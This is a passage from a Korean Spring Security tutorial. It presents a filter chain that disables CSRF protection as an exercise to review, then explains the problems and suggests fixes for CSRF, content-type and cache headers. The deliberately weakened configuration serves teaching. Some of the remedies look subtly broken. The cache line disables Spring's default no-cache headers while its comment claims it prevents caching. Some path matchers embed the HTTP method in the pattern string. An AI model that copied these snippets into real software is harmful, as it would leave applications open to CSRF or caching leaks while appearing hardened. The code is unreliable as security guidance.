    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .headers(headers -> headers
                .contentSecurityPolicy(csp -> csp
                    .policyDirectives("default-src 'self'")
                )
                .frameOptions(frameOptions -> frameOptions.deny())
            )
            .csrf(csrf -> csrf.disable()); // ❌ 문제?
        
        return http.build();
    }
}
```

**해설**
```
문제점:

1. CSRF 보호 완전 비활성화 ❌
   위험: POST/PUT/DELETE 요청이 CSRF 공격에 노출

개선:
```java
.csrf(csrf -> csrf
    .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
    .ignoringRequestMatchers(
        // Stateless API는 CSRF 불필요 (단, JWT/OAuth2 사용 시)
        "POST /api/webhook/**",
        "POST /api/token"
    )
)
```

2. X-Content-Type-Options 헤더 확인 필요
```java
.headers(headers -> headers
    .contentSecurityPolicy(csp -> csp
        .policyDirectives("default-src 'self'; " +
                        "script-src 'self'; " +
                        "style-src 'self' 'unsafe-inline';")
    )
    .frameOptions(frameOptions -> frameOptions.deny())
    .contentTypeOptions() // 명시적 추가
)
```

3. 캐시 제어 부재
```java
http.headers(headers -> headers
    .cacheControl(cache -> cache.disable()) // 민감 페이지 캐시 방지
)
```
```

<div align="center">

**[⬅️ 이전: XSS 3가지 유형](./01-xss-types.md)** | **[홈으로 🏠](../README.md)** | **[다음: CSP ➡️](./03-content-security-policy.md)**

</div>
